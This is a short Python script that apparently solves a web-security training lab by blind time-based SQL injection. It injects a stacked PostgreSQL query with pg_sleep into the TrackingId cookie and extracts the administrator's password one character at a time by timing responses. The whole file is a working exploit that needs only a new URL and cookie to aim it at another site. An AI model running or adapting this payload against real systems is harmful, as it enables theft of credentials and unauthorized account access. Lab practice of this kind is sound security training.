import requests

url = 'https://ac621f761e035911c0ec473600d700cd.web-security-academy.net/'
trackingId = 'hIqkwm7UVUOu6foI'

pass_len = 20
admin_pass = ''

while len(admin_pass) < pass_len:
    char = '0'
    valid = False
    while char <= 'z':
        payload = f"{trackingId}'%3bSELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {len(admin_pass)+1}, 1) = '{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--"
        resp = requests.get(url=url, cookies={'TrackingId': payload})

        if resp.elapsed.total_seconds() > 2:
            valid = True
            break

        if char == '9':
            char = 'a'
        else:
            char = chr(ord(char) + 1)

    if not valid:
        print('Failed to find character')
        break
        
    admin_pass += char
    print(f"Found {char}")

print(admin_pass)
